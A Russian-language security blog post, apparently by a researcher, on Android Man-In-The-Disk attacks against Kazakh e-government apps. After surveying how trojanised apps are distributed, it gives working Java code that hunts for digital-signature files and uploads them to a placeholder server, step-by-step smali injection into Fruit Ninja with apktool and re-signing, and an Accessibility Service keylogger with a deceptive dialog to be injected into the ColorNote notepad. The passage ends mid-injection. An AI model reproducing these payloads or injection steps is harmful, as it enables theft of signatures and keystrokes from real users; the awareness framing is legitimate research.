

# Воруем ЭЦП, используя Man-In-The-Disk / Как встроить кейлоггер в блокнот

{% post_url 2019-09-18-sepsis-malware-analysis %}

![](/assets/images/main_logo.png)

## Intro
![](http://orderofsixangles.com/2019/09/18/sepsis-malware-analysis.html)
Казахстанские мобильные приложения [mEGOV](https://play.google.com/store/apps/details?id=kz.nitec.egov.mgov) и [ЕНПФ](https://play.google.com/store/apps/details?id=kz.enpf.mobile) используют ЭЦП, как один из способов авторизации. Чтобы авторизоваться этим способом, вам необходимо перенести файл с ЭЦП на телефон. Такой метод авторизации уязвим перед атакой Man-In-The-Disk (о ней в подробностях ниже). Чтобы стать жертвой атаки, вам достаточно установить любое ваше любимое приложение, которые было скрытно модифицировано злоумышленником. Я наглядно покажу, как это может быть сделано. Так же я расскажу, как установив безобидный блокнот, вы можете получить кейлоггер. Для начала выясним, как такие приложения могут попасть к пользователю.

## Как вредоносные приложения попадают на телефон
 
### Локальные маркеты приложений Китая, Ирана и т.д
 
  Примеры: cafebazaar.ir, android.myapp.com, apkplz.net
  
  Данные площадки появились вследствии цензуры и блокировки Google сервисов и/или серверов официальных приложений. Обычно они содержат местные аналоги популярных приложений и их модификации. Такие модификации (как [этот иранский телеграм](https://apkplz.net/app/org.ir.talaeii)) содержат якобы новые, крутые фичи. В чем опасность таких приложений? Вы никогда не знаете, что они на самом деле делают. К тому же, правительства некоторых стран не упускают возможность и публикуют свои модификации, с инструментами для слежения за пользователем. Приложения с правительственной слежкой являются вредоносными по определению. Однажды, я изучал вредоносное приложение ([результат Virustotal](https://www.virustotal.com/gui/file/1e6a821f5de824b91c6676742a521a8dcdd345f25a820befa11e5975fc8c39d3/community), образец [тут](/assets/files/iranian_apk_infected.zip), пароль:infected), которое сканировало телефон на наличие телеграм-клонов:
  
  ```
  "com.hanista.mobogram"
  "org.ir.talaeii"
  "ir.hotgram.mobile.android"
  "ir.avageram.com"
  "org.thunderdog.challegram"
  "ir.persianfox.messenger"
  "com.telegram.hame.mohamad"
  "com.luxturtelegram.black"
  "com.talla.tgr"
  "com.mehrdad.blacktelegram"
  ```
  
  Данный список говорит о реальной актуальности и популярности таких приложений. Исследованние данного вредоноса, привело меня к [статье](https://cybershafarat.com/2016/01/20/farsitelegram/), в которой рассказывается о клоне телеграма, которое распостранялось через маркет *Cafebazaar*, Иранским правительством. Цитата оттуда:
  
> This looks to be developed to the specifications of the Iranian government enabling them to track every bit and byte put forward by users of the app.  
  
  Сколько клонов телеграма вы видите?: ([Источник](https://apkplz.net/))
  
  ![image](/assets/images/iran_telegrams.png)
  
  Обычным пользователям защититься от этого практически невозможно, так как другого выбора нет - официальные источники усиленно блокируются, а свои продвигаются. Исследователи и антивирусные компании со всего мира, после выявления зараженных приложений, оперативно сообщают об этом в Google и они удаляются из Play Market, что очевидно, не распостраняется на стороннии маркеты приложений. Так же на них не распостраняется политика Google, относительно допуска размещаемых приложений.
  
  Некоторые из маркетов очень популярны, как например *Tencent My App*, с 260 млн. пользователей в месяц ([Источник](https://www.appinchina.co/market/app-stores/))
  
  ![image](/assets/images/china_app_stores.png)
  
  Локальные приложения, используемые в рамках одного региона/страны, часто используют одни и те же SDK (набор библиотек) для рекламного трекинга, интеграции соц. сетей и т.д.. Если одна и та же библиотека используется в нескольких приложениях, то с большой вероятностью, некоторые из этих приложений, могут быть установлены у одного пользователя. Такие библиотеки могут использовать возможности разных приложений, в которые они встроены, для кражи данных пользователя, в обход выданных разрешений. Например, одно приложение имеет доступ к получению IMEI, но не имеет доступа к интернету. Встроенная библиотека знает об этом и поэтому считывает IMEI и сохраняет его на SD карте в скрытой папке. Та же библиотека встроенная в другое приложение, у которого есть доступ в интернет, но нету доступа к IMEI, считывает его со скрытой папки и отправляет на свой сервер. Данный способ использовался двумя китайскими компаниями Baidu и Salmonads. Подробнее об этом можете прочитать [тут](https://www.ftc.gov/system/files/documents/public_events/1415032/privacycon2019_serge_egelman.pdf). 
  
### Фишинг

Классический фишинг, является основным инструментом международных группировок и [спецслужб разных стран](https://www.theverge.com/2018/1/18/16905464/spyware-lebanon-government-research-dark-caracal-gdgs). Как это часто бывает, берется обычное приложение мессенджер, в него добавляется функционал для слежения, а потом оно массово рассылается, с пометкой "Посмотри, какое крутое приложение для общения". Доставка пользователям может осуществляется через соц. сети, спам Whatsapp/Telegram, встроенная реклама на сайтах и т.д..

![](/assets/images/dark_caracal_phishing.png)
[Источник, стр 19.](https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf)

Фишинговые ссылки, в виде постов в фейсбуке:

![](/assets/images/dark_caracal_phishing_2.png)

[Источник, стр. 22](https://info.lookout.com/rs/051-ESQ-475/images/Lookout_Dark-Caracal_srr_20180118_us_v.1.0.pdf)

Всплывающее окно на одном известном сайте

![img](/assets/images/whatsapp_fishing.png)

[Источник](https://xakep.ru/2017/01/27/mobile-phishing/)

### Телеграм боты/группы

Пример: @apkdl_bot, t.me/fun_android

  Существуют телеграм боты, для скачивания apk файлов. Вместо легитимного приложения, вам могут подсунуть вредоносное. Либо заразить запрашиваемое вами приложение "на лету". Работает это так - вы вводите команду боту/в группу, что хотите скачать "Instagram", скрипт на другой стороне скачивает его с Google Play, распаковывает, добавляет вредоносный код, запаковывает обратно и возвращает вам. Как это делается автоматически, я попытаюсь показать на примере в ближайшем будущем.

### Сторонние сайты-посредники
 
 Пример: apkpure.com, apkmirror.com, apps.evozi.com/apk-downloader/
 
 Существует огромное количество неофициальных сайтов, для скачивания андроид приложений. Некоторые из них предоставляют возможность загрузить свое приложение, которое может быть вредоносным. Пример загрузки на [этом сайте](https://www.apkmirror.com/#uploadAPK):
 
 ![img](/assets/images/apkmirror_submit.png)
   
  Один из примеров малвари, которая распостранялась таким образом ([Источник](https://www.cmcm.com/blog/en/security/2015-09-18/799.html)):
  
  ![img](/assets/images/how_ghost_push_work.jpg)
  
  Примерную статистику, для неофициальных источников, можно найти в [Android Security Report 2018](https://source.android.com/security/reports/Google_Android_Security_2018_Report_Final.pdf) - 1.6 миллиардов заблокированных Google Play Protect установок не из Google Play. Всего установок было гораздо больше.
  Некоторые даже пишут [статьи](https://www.makeuseof.com/tag/using-android-without-google/), как это хорошо, пользоваться сторонними маркетами. 
  Отдельный целый мир составляют сайты, которые распостраняют приложения без рекламы, взломанные платные приложения бесплатно, приложения с дополнительным функционалом:
  
  ![](/assets/images/mx_player_patched.png)
  
  ![](/assets/images/ccleaner_cracked.png)
  
### Google play
 
 Официальный источник имеет защиту от подозрительных приложений, под названием Google Play Protect, которая использует машинное обучение для определения степени вредоносности. Но такая защита не в состоянии точно понять, какое приложение вредоносное, а какое нет, так как для этого требуется полная ручная проверка. Чем отличается шпионское приложение, которое мониторит все ваши передвижения, от приложения для бега? Исследователи [постоянно](https://news.drweb.ru/show/?i=13349&lng=ru) [находят](https://www.zdnet.com/article/android-security-flashlight-apps-on-google-play-infested-with-adware-were-downloaded-by-1-5m-people/) [сотнями](https://www.zdnet.com/article/google-malware-in-google-play-doubled-in-2018-because-of-click-fraud-apps/) [зараженные](https://www.express.co.uk/life-style/science-technology/1143651/Android-warning-malware-Google-Play-Store-security-June-23) [приложения](https://www.vice.com/en_us/article/43z93g/hackers-hid-android-malware-in-google-play-store-exodus-esurv), опубликованные в Google Play.
  
  Обычно вредоносное приложение называет себя *google play services* или схожим образом, и [ставит похожую иконку](https://www.zdnet.com/article/this-trojan-masquerades-as-google-play-to-hide-on-your-phone). Это вводит в заблуждение пользователей. Почему гугл плей не проверяет иконку на схожесть со своими официальными приложениями - непонятно. Однажды в телеграме, я поставил аватарку с бумажным самолетиком и меня заблокировали. Еще один способ, используемый вредоносными приложениями, это замена букв ("L" на "I", "g" на "q"), для создания, похожего на официальное приложение, имени:
  
  ![image](/assets/images/spoil_name.png) 
  
  [Источник](https://ti.360.net/blog/articles/stealjob-new-android-malware-used-by-donot-apt-group-en/). 

### Другие способы

1. [В сервисах ремонта телефонов](https://www.thesun.co.uk/tech/4298260/smartphone-screen-repair-shops-could-let-spies-into-your-phone/)

2. [При пересечении границы](https://www.theguardian.com/world/2019/jul/02/chinese-border-guards-surveillance-app-tourists-phones)

3. Подключение к незнакомому компьютеру по USB, с включенным режимом отладки. 

4. Получение злоумышленником доступа к вашему гугл аккаунту, и установки приложения на телефон через Google Play. 

5. [Предустановленные приложения](https://thehackernews.com/2016/11/hacking-android-smartphone.html)

6. [По решению суда и без. Полицией или спецслужбами](https://security.stackexchange.com/questions/194353/police-forcing-me-to-install-jingwang-spyware-app-how-to-minimize-impact)

7. [Watering hole attack](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/137/watering-hole-101?ClickID=cqlns7xfva7wwxx4iiw4qfvpxkllkiqwpkz)

8. Вы пришли в гости к другу, а его [телевизор заразил ваш телефон](http://www.aftvnews.com/android-malware-worm-that-mines-cryptocurrency-is-infecting-amazon-fire-tv-and-fire-tv-stick-devices/)

> The particular version appearing on Fire TV devices installs itself as an app called “Test” with the package name “com.google.time.timer”. Once it infects an Android device, it begins to use the device’s resources to mine cryptocurrencies and attempts to spread itself to other Android devices on the same network.

## Как злоумышленники заражают андроид приложения

Теперь мы поняли, как вредоносное приложение может попасть к вам на телефон. Далее будет продемонстировано, как злоумышленник может модифицировать любое андроид приложение. Будет использован пример с внедрением кода в популярную игру [Fruit Ninja](https://play.google.com/store/apps/details?id=com.halfbrick.fruitninjafree). Код сканирует память телефона, ищет файл с ЭЦП и отсылает на сервер (root естественно не требуется). 

### Что такое Man-In-The-Disk?

Общественность обратила внимание на данный вектор атаки, после этой [статьи](https://blog.checkpoint.com/2018/08/12/man-in-the-disk-a-new-attack-surface-for-android-apps/). Советую, для начала, ее прочитать.

*Для тех кто прочитал, добавлю от себя - модификация общих файлов других приложений, так же может привести к эксплуатации уязвимостей в библиотеках, которые используют эти файлы*

Кто не прочитал, расскажу в кратце. Для начала, определимся с понятиями. В андроиде, память для приложений, разделяется на Internal Storage и External Storage. Internal storage - это внутренняя память приложения, доступная только ему и никому больше. Абсолютно каждому приложению на телефоне соответствует отдельный пользователь и отдельная папка с правами только для этого пользователя. Это отличный защитный механизм. External storage - основная память телефона, доступная всем приложениям (сюда же относится SD карта). Зачем она нужна? Возьмем приложение фоторедактор. После редактирования, вы должны сохранить фото, чтобы оно было доступно из галереи. Естественно, что если вы положите его в internal storage, то никому, кроме вашего приложения оно доступно не будет. Или бразуер, который скачивает все файлы в общую папку Downloads.

У каждого андроид приложения есть свой набор разрешений, которые оно запрашивает. Но с ними все не так хорошо. Среди них есть такие, на которые люди охотно закрывают глаза и не относятся серъезно. Среди них - READ_EXTERNAL_STORAGE. Оно позволяет приложению получать доступ к основной памяти телефона, а значит и ко всем данным других приложений. Никто ведь не удивиться, если приложение "блокнот" запросит данное разрешение. Ему может быть необходимо хранить там настройки и кэш. Манипуляция данными других приложений в external storage и есть атака Man-In-The-Disk. Другое, почти дефолтное, разрешение - INTERNET. Как видно из названия, оно позволяет приложению иметь доступ в сеть. Самое печальное, что пользователю не показывается специальное окно с просьбой дать это разрешение. Вы просто прописываете его в своем приложении и вам его дают.

Я скачал топ-15 казахстанских приложений и написал [скрипт](https://github.com/thatskriptkid/OrderOfSixAngles), который выводит статистику запрашиваемых разрешений. Как видите, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE и INTERNET очень популярны. Значит злоумышленники могут менее болезнено встраивать код, которые ворует ЭЦП, в большинство приложений.

<details>
  <summary>Список протестированных приложений</summary>
  2-GIS, AliExpress, Chocofood, Chrome, InDriver, Instagram, Kaspi, Kolesa, Krisha, Telegram, VK, WhatsApp, Yandex Music, Yandex Taxi
,Zakon KZ
</details>

![top-15-apps](/assets/images/permissions.png)

  Если вы пользуетесь Whatsapp, то все ваши сообщения хранятся в папке, доступной всем приложениям.
  
  ![](/assets/images/whatsapp_db.png)
  
  Грубо говоря, любое приложение на вашем телефоне может их скачать и отправить себе на сервер. А далее расшифровать с помощью любого доступного скрипта в сети. А если поставить whatsapp на рутованый телефон, то все ваши переписки хранятся в открытом виде. Видимо whatsapp не считает нужным даже использовать шифрование, на таком "порченом" телефоне. Так же, в external storage, whatsapp хранит SSLSessionCache (File-based cache of established SSL sessions). В будущем, попытаюсь исследовать, как можно использовать эти файлы, полученные с чужого телефона. 

![](/assets/images/whatsapp_ssl.png)

Телеграм и Инстаграм хранят в общей памяти закешированные изображения. Практически все просматриваемые вами фото, и те которые вы пересылаете друг другу, доступны любому приложению у вас на телефоне.

![](/assets/images/telegram_external.png)

Приложения mEGOV и ENPF, требуют, чтобы ЭЦП находилась в External Storage:

![](/assets/images/egov.png)

![](/assets/images/enpf.png)

Google в курсе проблемы и [собирается изменить](https://developer.android.com/preview/privacy/scoped-storage?hl=ru) READ_EXTERNAL_STORAGE в Android Q. Цитата:

> In order to access any other file that another app has created, including files in a "downloads" directory, your app must use the Storage Access Framework, which allows the user to select a specific file. 

## Создаем payload

Перейдем к основному функционалу сканера. Он будет состоять из трех основных классов: ```StageAttack```, ```MaliciousService```, ```MaliciousTaskManager```. 

![img](assets\images\sign_scan\prj_struct.png)

```StageAttack``` - состоит из одного статического метода, который начинает нашу атаку. Мы специально создаем переходный статический метод, для удобства внедрения в готовый класс.

{% highlight java %}
public class StageAttack {

    public static void pwn(Context ctx) {
        Intent intent = new Intent(ctx,  MaliciousService.class);
        ctx.startService(intent);
    }
}

{% endhighlight %}

```MaliciousService``` - сервис, который рекурсивно осуществляет поиск по всему external storage.

{% highlight java %}
private String pwn2(File dir) {

	String path = null;
	File[] list = dir.listFiles();

    for (File f : list) {

	    if (f.isDirectory()) {
		path = pwn2(f);
		if (path != null)
		    return path;
	    } else {
		path = f.getAbsolutePath();
		if (path.contains("AUTH_RSA")) {
		    Log.d(TAG, "AUTH_RSA found here - " + path);
		    return path;
		}
	    }
    }
    return null;
}
{% endhighlight %}

Если ЭЦП не найдено, мы будем повторять поиск каждые 5 секунд, пока не найдем. Интервал можно использовать любой. Взяв слишком маленький интервал, наш сервис рискует быть остановленным системой. Чем выше версия андроида, тем суровее политика в отношении работы фоновых процессов. Foreground service мы тоже не можем использовать, так как для этого постоянно должно висеть уведомление. Не являясь андроид разработчиком, я потратил кучу времени, чтобы найти способ запланировать задачу, которая будет выполняться точно в срок. Это не так просто, как кажется. В андроиде есть несколько рекомендуемых для этого способов (JobService, WorkManager, setRepeating() AlarmManager'а). В документации неочевидно указано, что интервал задачи должен быть не менее 15 минут и время ее выполнения зависит от желания системы. Нас это не устраивает, поэтому мы используем класс ```AlarmManager```, метод ```setExactAndAllowWhileIdle()```. Когда задача выполниться, снова ее планируем, с таким же интервалом. Это единственный на данный момент способ известный мне, имеющий самую высокую точность.

{% highlight java %}
private void scheduleMalService() {

        Context ctx = getApplicationContext();
        AlarmManager alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(ctx, MaliciousTaskManager.class);

        final int _id = (int) System.currentTimeMillis();
        PendingIntent alarmIntent = PendingIntent.getBroadcast(ctx, _id, intent, 0);

        alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() 
		+ 5000, alarmIntent);
    }
{% endhighlight %}

Если ЭЦП найдено, то мы отправляем файл на сервер:

{% highlight java %}
private void sendToServer(String path) {
    File file = new File(path);
    URL url = new URL("http://xxxxxxxxxx");
    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
    urlConnection.setConnectTimeout(30 * 1000);

    urlConnection.setRequestMethod("POST");
    urlConnection.setDoOutput(true);
    urlConnection.setRequestProperty("Content-Type", "application/octet-stream");

    DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
    request.write(readFileToByteArray(file));
    request.flush();
    request.close();

    int respCode = urlConnection.getResponseCode();
    Log.d(TAG, "Return status code: " + respCode);
}
{% endhighlight %}

## Внедряем payload

Первым делом декомпилируем Fruit Ninja, с помощью [apktool](https://ibotpeaches.github.io/Apktool/). Мы не декомпилируем приложение до java кода, так как после модификации, мы не сможем собрать его обратно. Нам необходимо получить именно smali классы. И внедрять наш код мы тоже будем в виде smali кода. 

<details>
  <summary>Что такое smali код?</summary>
	Андроид приложения компилируются в байткод, который исполняется виртуальной машиной Dalvik. Сам байткод тяжело читаем, поэтому его удобочитаемая для человека форма, называется smali. smali - это аналог языка ассемблера, но для андроида.
</details>

Далее, если мы хотим, чтобы наш payload запустился при старте приложения, мы должны модифицировать входную точку. Входной точкой любого GUI приложения является класс-потомок Activity, который принимает ACTION_MAIN. Открываем папку с декомпилированным приложением, и находим его в файле AndroidManifest.xml:

{% highlight xml %}
<activity android:name="com.halfbrick.mortar.MortarGameLauncherActivity">
	<intent-filter>
		<action android:name="android.intent.action.MAIN"/>
		<category android:name="android.intent.category.LAUNCHER"/>
	</intent-filter>
</activity>
{% endhighlight %}

Мы нашли нужный нам класс ```com.halfbrick.mortar.MortarGameLauncherActivity```. Перед тем, как изучить его, посмотрим на жизненный цикл Activity, это нам пригодится. 

![activity life cycle](/assets/images/activity_lifecycle.png)

[Источник](https://developer.android.com/reference/android/app/Activity)

Открываем Activity, у меня он лежит по пути *base\smali_classes2\com\halfbrick\mortar\MortarGameLauncherActivity.smali*. Если вы до этого не видели smali код, это не страшно, он достаточно прост для **чтения** и логически понятен.

```java
.class public Lcom/halfbrick/mortar/MortarGameLauncherActivity;
// Имя класса и его package

.super Landroid/app/Activity;
//.super указывает от какого класса наследуемся. 
//Все Activity должны наследоваться от android.app.Activity.

.source "MortarGameLauncherActivity.java"
// Исходный Java файл.

.method public constructor <init>()V
/* Ключевые слова говорят сами за себя - это конструктор класса. 
Самая последняя буква, это тип возвращаемого значения.
В данном случае, V - void */

    .locals 0
/* Виртуальная машина Dalvik не использует стек, вместо этого 
используются регистры. Регистры это просто ячейки, которые
могут хранить любые типы данных. Каждая функция имеет 
свой личный набор регистров. В зависимости от инструкции, 
доступных регистров может быть 16, 256 или 64К. Регистры 
делятся на локальные регистры и регистры, для аргументов.
В локальные регистры можно класть локальные переменные. 
В регистры для аргументов, кладут входные параметры функций.
.locals 0 - означает, что в методе 0 локальных регистров. 
К локальным регистрам обращаются, как v0, v1, v2, v3, ... 
К аргументным регистрам - p0, p1, p2, p3. 
*/

    .line 28
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
/* invoke-подобные инструкции  используются для вызова функций.
invoke-direct - вызов нестатической функции, которую нельзя 
переопределить. Функции, которые нельзя переопределить в java
- private и конструкторы. Если функцию можно переопределить, 
то соответственно будет произведен поиск по таблице, содержащей
переопределенния метода.  В скобках указываются входные 
параметры функции. p0 - по умолчанию означает this в java.
init говорит о том, что здесь вызывается родительский конструктор.
*/
    return-void
// ничего не возвращаем
.end method

.method protected onStart()V
    .locals 2
    
    .line 33
    invoke-super {p0}, Landroid/app/Activity;->onStart()V
// Вызываем onStart() родительского класса

    .line 35
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->isTaskRoot()Z
/* invoke-virtual - вызов виртуального метода. Виртуальный метод может быть переопределен,
а значит не является static, private, final или конструктором. Класс MortarGameLauncherActivity
не имеет метода isTaskRoot(), а значит он вызывается в родительском классе Activity. 
Возвращаемый тип Z - boolean */

    move-result v0
/* Кладем результат функции isTaskRoot() в регистр v0. isTaskRoot() возвращает 
true, если данное Activity является первым, которое открывается при
запуске приложения */

    if-nez v0, :cond_0
/* Если v0 = true, то переходим по метке cond_0 (аналог goto). 
Если v0 = false, продолжаем выполнение 
*/
    .line 37
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->finish()V
// finish() закрывает Activity

    return-void
// Завершаем выполнение функции

    .line 41
    :cond_0
    new-instance v0, Landroid/content/Intent;
// Создаем объект Intent и кладем ссылку на него в регистр v0

    const-class v1, Lcom/halfbrick/mortar/MortarGameActivity;
//Кладем ссылку на класс MortarGameActivity в регистр v1. MortarGameActivity это уже другое Activity.

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
// вызываем конструктор класса Intent, с параметрами, которые заполнили выше

    .line 42
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->finish()V
// закрываем наше Activity 

    .line 43
    invoke-virtual {p0, v0}, Lcom/halfbrick/mortar/MortarGameLauncherActivity;->startActivity(Landroid/content/Intent;)V
// Открываем MortarGameActivity

    return-void
.end method
```

Выяснили, что ```MortarGameLauncherActivity``` запускает ```MortarGameActivity``` и закрывается. Открываем ```MortarGameActivity```. Комментировать полностью его не будем. Нам интересно то, что происходит в методе ```Oncreate```, так как с него начинается создание активити. Сразу после него будем вставлять наш код. Важно не нарушить порядок line, при вставке.

```java
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9

    :try_start_0
    const-string v0, "android.os.AsyncTask"

    .line 465
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 471
    :catch_0
    invoke-super {p0, p1}, Landroid/support/v4/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V
    
	  <--------------------------- //вставлять будем сюда, как строку 472
    
    .line 473
    invoke-static {}, Lcom/halfbrick/mortar/NativeGameLib;->TryLoadGameLibrary()Z

    .line 475
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;->getIntent()Landroid/content/Intent;
    
    ...
```

Теперь нам нужен smali код payload'а. Собираем в apk наш сканер и декомпилируем. Переносим наши три декомпилированных класса, которые лежат по пути *smali\kz\c\signscan*, в папку *com/halfbrick/mortar*. Меняем *package name* всем классам, с *kz.c.signscan* на *com.halfbrick.mortar*. 

Было:

```java
.class public Lkz/c/signscan/StageAttack;
```

Стало:
```java
.class public Lcom/halfbrick/mortar/StageAttack;
```

В smali классе ```MainActivity``` берем строчку вызова payload'а:
```java
invoke-static {p0}, Lcom/halfbrick/mortar/StageAttack;->pwn(Landroid/content/Context;)V
```

И вставляем в ```MortarGameActivity```. В итоге метод ```onCreate()``` выглядит:

```java
...
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9

    :try_start_0
    const-string v0, "android.os.AsyncTask"

    .line 465
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 471
    :catch_0
    invoke-super {p0, p1}, Landroid/support/v4/app/FragmentActivity;->onCreate(Landroid/os/Bundle;)V
	
	.line 472
    invoke-static {p0}, Lcom/halfbrick/mortar/StageAttack;->pwn(Landroid/content/Context;)V
	
    .line 473
    invoke-static {}, Lcom/halfbrick/mortar/NativeGameLib;->TryLoadGameLibrary()Z

    .line 475
    invoke-virtual {p0}, Lcom/halfbrick/mortar/MortarGameActivity;->getIntent()Landroid/content/Intent;
    
    ...
```

Класс ```MaliciousTaskManager``` в payload это BroadcastReceiver, а ```MaliciousService``` это IntentService, поэтому мы должны их прописать в манифесте.

```xml
...
<receiver android:name=".MaliciousTaskManager"/>
<service android:name=".MaliciousService"/>
...
```

Запаковываем все обратно командой ```apktool b myfolder```. В итоге получим apk файл. Теперь нам необходимо его подписать, чтобы андроид принял наше приложение. Для начала сгенерируем ключ, которым будем подписывать:

```
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
```

Подписываем apk:
```
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore my_application.apk alias_name
```

Virustotal нам ничего не покажет, так как ничего "нелегального" мы делаем. Мы всего-лишь пользуемся доступными разрешениями нашего приложения.

![](/assets/images/ninja_fruit_virustotal.png)

Видео, с демонстрацией конечной работы:

https://youtu.be/e5w5taMY8MA

https://youtu.be/iBCX_A5FBVU

## Добавляем кейлоггер в блокнот

В этой части, я покажу, как злоумышленник может внедрить кейллогер в простой [блокнот](https://play.google.com/store/apps/details?id=com.socialnmobile.dictapps.notepad.color.note). Отличие от предыдущего варианта будет в том, что внедряться, помимо кода, будет еще и GUI элемент. 

### Keylogger не требующий рута

На данный момент, мне известно два способа создания кейлоггера под андроид, на нерутованном телефоне. Первый способ - создание своей виртуальной клавиатуры. Вы устанавливаете такое приложение и добавляете его в настройках, как виртуальную клавиатуру.

![](/assets/images/virtual_keyboard.jpg)

Это способ самый бесполезный, собственная клавиатура хорошо видна пользователю. Второй способ, это создание Accessibility Service. Такие сервисы, встраиваются в приложения, для людей с ограниченными возможностями. Они имеют доступ ко многим вещам, одна из которых - пользовательский ввод. Именно то что нужно для кейлоггера.

## Создаем payload

Payload будет состоять из трех классов - ```ExecuteAttack```, ```GoogleService```, ```SendService```. Класс ```MainActivity``` просто вспомогательный. И еще у нас будет xml конфиг AccessibilityService.

![](/assets/images/keylogger_prj.png)

Чтобы наш Accessibility Service начал работать, пользователю необходимо включить его в настройках. Мы поможем в этом пользователю, внедрив в приложение всплывающее окно, с текстом *Please enable app in settings! Otherwise it will stop working* (можно использовать и более пугающий текст). И добавим кнопочку, чтобы пользователь по ней кликнул и перешел сразу в настройки. Класс ```ExecuteAttack``` именно это и делает.

![](/assets/images/alert_window.png)

```java
public static void openSettings(final Context ctx) {
        AlertDialog alertDialog = new AlertDialog.Builder(ctx).create();
        alertDialog.setTitle("Alert");
        alertDialog.setMessage("Please enable app in settings! Otherwise it will stop working");
        alertDialog.setButton(AlertDialog.BUTTON_NEUTRAL, "Settings",
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int which) {
                        ctx.startActivity(new Intent("android.settings.ACCESSIBILITY_SETTINGS"));
                    }
                });
        alertDialog.show();
    }
```
```GoogleService``` - основная логика кейллогера. Является AccessibilityService:

```java
public class GoogleService extends AccessibilityService {
```

Метод ```onAccessibilityEvent()``` принимает все входящие события. Событие ```AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED``` приходит, когда пользователь вводит текст в поле какое-нибудь. Мы отлавливаем именно его. Весь ввод записываем в буфер. И каждые 10 секунд отправляем этот буфер на свой сервер, стартуя ```SendService```. 

```java
public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:

                int len = event.getText().toString().length();
                char c;
                if (len > 0) {
                    c = event.getText().toString().charAt(len - 2);

                    buf += c;
                }
                break;
            default:
                break;
        }
        Log.d(TAG, "Keylogger buffer now " + buf);
        Date now = new Date();
        Date newTime = new Date(GoogleService.CURRENT_TIMESTAMP.getTime() + 10 * 1000);

        if (now.after(newTime) && !"".equals(buf)) {

            Context ctx = getApplicationContext();

            Intent intent = new Intent(ctx, SendService.class);

            intent.putExtra("text", buf);
            ctx.startService(intent);

            GoogleService.CURRENT_TIMESTAMP = now;
            buf = "";
        }
    }
```

Конфиг, нашего ```GoogleService```, выглядит так:

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged"
    android:accessibilityFeedbackType="feedbackSpoken|feedbackHaptic|feedbackAudible|feedbackVisual|feedbackGeneric|feedbackAllMask"
    android:notificationTimeout="100"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews"
    android:canRetrieveWindowContent="false" />
```

В нем указывается, на какие события подписывается наш сервис и другая информация.

```SendService``` - просто отправляет данные на сервер.

```java
private void sendResult(String text) {

        Log.d(TAG, "Sending result to server");

        HttpURLConnection urlConnection = null;

        try {
            int length = text.length();

            URL url = new URL("http://xxxxxxxxx");
            urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setConnectTimeout(30 * 1000);

            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            urlConnection.setDoInput(false);
            urlConnection.setRequestProperty("Content-Type", "text/plain");
            urlConnection.setRequestProperty("Content-Length", Integer.valueOf(length).toString());

            DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
            Log.d(TAG, "Sending " + text);
            request.write(text.getBytes(StandardCharsets.UTF_8));
            request.flush();
            request.close();

            int respCode = urlConnection.getResponseCode();
            Log.d(TAG, "Return status code: " + respCode);
            urlConnection.disconnect();
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }

    }
```

```MainActivity``` - нам нужен лишь для получения smali кода вызова основного метода.

Собираем apk, декомпилируем, с помощью ```apktool```, и пока оставляем так.

## Внедряем payload

Зайдем в Play Market и скачиваем достаточно популярное приложение [ColorNote](https://play.google.com/store/apps/details?id=com.socialnmobile.dictapps.notepad.color.note). Декомпилируем его, с помощью ```apktool```. Открываем манифест, чтобы найти главный активити. Как говорилось раннее, нам это необходимо для того, чтобы наш кейлоггер работал сразу, после запуска приложения.

```xml
<activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" 
	  
	  android:label="@string/app_name" android:name="com.socialnmobile.colornote.activity.Main" 
	  
	  android:taskAffinity="colornote.task.main" android:theme="@style/Theme.NoTitle.Light" 
	  
	  android:windowSoftInputMode="adjustPan">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
                <category android:name="android.intent.category.MULTIWINDOW_LAUNCHER"/>
                <category android:name="android.intent.category.MONKEY"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <action android:name="android.intent.action.EDIT"/>
                <action android:name="android.intent.action.PICK"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="vnd.android.cursor.dir/vnd.socialnmobile.colornote.note"/>
            </intent-filter>
```

